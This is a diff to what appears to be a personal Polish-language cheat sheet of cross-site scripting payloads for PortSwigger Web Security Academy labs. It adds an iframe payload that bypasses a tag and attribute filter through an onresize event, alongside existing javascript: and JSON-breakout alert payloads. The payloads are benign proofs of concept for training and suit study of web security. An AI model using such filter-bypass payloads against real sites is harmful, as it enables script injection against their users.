@@ -17,3 +17,7 @@ javascript:alert('You are hacked!')
 
 [Na format jason wyskakuje z skryptu javascript (opisane na stornie)]
 \"-alert(1)}//                        (https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)
+
+[Podatny parametr w pasku url (odkryty przez fazowanie (znacznikow html) i (dozwolonych metod))]
+Website: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
+Payload: <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
